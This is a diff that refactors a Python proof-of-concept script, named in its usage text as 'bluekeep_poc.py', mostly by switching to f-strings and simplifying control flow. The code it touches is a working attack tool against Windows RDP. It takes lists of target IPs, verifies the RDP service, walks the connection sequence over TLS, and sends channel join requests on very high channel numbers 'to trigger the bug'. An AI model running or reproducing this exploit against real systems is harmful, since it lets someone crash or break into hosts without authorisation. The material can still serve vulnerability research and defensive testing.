@@ -194,14 +194,13 @@ class DoPduConnectionSequence(object):
         padding = "41" * size
         if do_padding:
             exp = request_packets["dep"] + request_packets["ms_t120"] + padding
-            results = Packer(exp).bin_unpack()
+            return Packer(exp).bin_unpack()
         else:
             for channel in channels:
                 current_channel = request_packets["req"] + \
-                    hex(channel)[2:].zfill(4)
+                        hex(channel)[2:].zfill(4)
                 pdu_channels.append(Packer(current_channel).bin_unpack())
-            results = pdu_channels
-        return results
+            return pdu_channels
 
     @staticmethod
     # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/9cde84cd-5055-475a-ac8b-704db419b66f
@@ -244,11 +243,11 @@ PROTOCOL_SSL = 1
 
 
 def info(string):
-    print("[ \033[32m+\033[0m ] {}".format(string))
+    print(f"[ \033[32m+\033[0m ] {string}")
 
 
 def error(string):
-    print("[ \033[31m!\033[0m ] {}".format(string))
+    print(f"[ \033[31m!\033[0m ] {string}")
 
 
 # connect the sockets and return the received data plus the connection in a Tuple
@@ -271,14 +270,14 @@ def check_rdp_service(address):
     test_packet = DoPduConnectionSequence().connection_request_pdu()
     send_packet = test_packet + rdp_correlation_packet
     results = socket_connection(send_packet, address, receive_size=9126)
-    if results is not None:
-        if results[0]:
-            info("successfully connected to RDP service on host: {}".format(address))
-            GIS_RDP.append(address)
-        else:
-            error("unknown response provided from RDP session")
-    else:
+    if results is None:
         error("unable to connect")
+
+    elif results[0]:
+        info(f"successfully connected to RDP service on host: {address}")
+        GIS_RDP.append(address)
+    else:
+        error("unknown response provided from RDP session")
 
 
 # start the connection like a boss
@@ -304,8 +303,7 @@ def start_rdp_connection(ip_addresses):
             info("sending Client MCS Connect Initial PDU request packet -->")
             tls.sendall(DoPduConnectionSequence().mcs_connect_init_pdu())
             returned_packet = tls.recv(8000)
-            info(
-                "<-- received {} bytes from host: {}".format(hex(len(returned_packet)), ip))
+            info(f"<-- received {hex(len(returned_packet))} bytes from host: {ip}")
 
             # erect domain and attach user to domain
             info("sending Client MCS Domain Request PDU packet -->")
@@ -314,8 +312,7 @@ def start_rdp_connection(ip_addresses):
             tls.sendall(DoPduConnectionSequence(
             ).mcs_attach_user_request_pdu())
             returned_packet = tls.recv(8000)
-            info(
-                "<-- received {} bytes from host: {}".format(hex(len(returned_packet)), ip))
+            info(f"<-- received {hex(len(returned_packet))} bytes from host: {ip}")
 
             # send join requests on ridiculously high channel numbers to trigger the bug
             info("sending MCS Channel Join Request PDU packets -->")
@@ -324,9 +321,9 @@ def start_rdp_connection(ip_addresses):
                 tls.sendall(pdu)
                 channel_number = int(Packer(pdu).bin_pack()[-4:], 16)
                 returned_packet = tls.recv(1024)
-                info("<-- received {} bytes from channel {} on host: {}".format(
-                    hex(len(returned_packet)), channel_number, ip
-                ))
+                info(
+                    f"<-- received {hex(len(returned_packet))} bytes from channel {channel_number} on host: {ip}"
+                )
 
             # my personal favorite is the security exchange, took me awhile to figure this one out
             info("sending Client Security Exhcange PDU packets -->")
@@ -334,9 +331,7 @@ def start_rdp_connection(ip_addresses):
             ).do_client_security_pdu_exchange())
             tls.sendall(DoPduConnectionSequence().client_info_pdu())
             returned_packet = tls.recv(8000)
-            info("<-- received {} bytes from host: {}".format(
-                hex(len(returned_packet)), ip
-            ))
+            info(f"<-- received {hex(len(returned_packet))} bytes from host: {ip}")
 
             # confirm that the client is now active
             confirm_packet = (
@@ -357,8 +352,7 @@ def start_rdp_connection(ip_addresses):
             info("sending Client Confirm Active PDU packet -->")
             tls.sendall(Packer(confirm_packet).bin_unpack())
             returned_packet = tls.recv(1024)
-            info(
-                "<-- received {} bytes from host: {}".format(hex(len(returned_packet)), ip))
+            info(f"<-- received {hex(len(returned_packet))} bytes from host: {ip}")
 
             # finish the connection sequence
             info("sending Client Synchronization PDU packet -->")
@@ -381,7 +375,7 @@ def start_rdp_connection(ip_addresses):
             info(results[1])
             results[1].close()
         except Exception as e:
-            error("unable to connect: {}".format(e))
+            error(f"unable to connect: {e}")
             continue
 
 
@@ -389,8 +383,7 @@ def main():
     to_scan = []
     opt = Parser().optparse()
     if opt.ipAddyList is not None:
-        for ip in opt.ipAddyList.split(","):
-            to_scan.append(ip)
+        to_scan.extend(iter(opt.ipAddyList.split(",")))
     elif opt.ipAddyFile is not None:
         try:
             open(opt.ipAddyFile).close()
@@ -398,16 +391,15 @@ def main():
             error("that file doesn't exist?")
             exit(1)
         with open(opt.ipAddyFile) as addresses:
-            for address in addresses.readlines():
-                to_scan.append(address.strip())
+            to_scan.extend(address.strip() for address in addresses)
     else:
         info(
             "python bluekeep_poc.py [-i addy1[,addy2,...]] [-f /path/to/file]")
         exit(1)
     for scan in to_scan:
-        info("verifying RDP service on: {}".format(scan))
+        info(f"verifying RDP service on: {scan}")
         check_rdp_service(scan)
-    info("starting RDP connection on {} targets".format(len(GIS_RDP)))
+    info(f"starting RDP connection on {len(GIS_RDP)} targets")
     print("\n\n")
     start_rdp_connection(GIS_RDP)
 
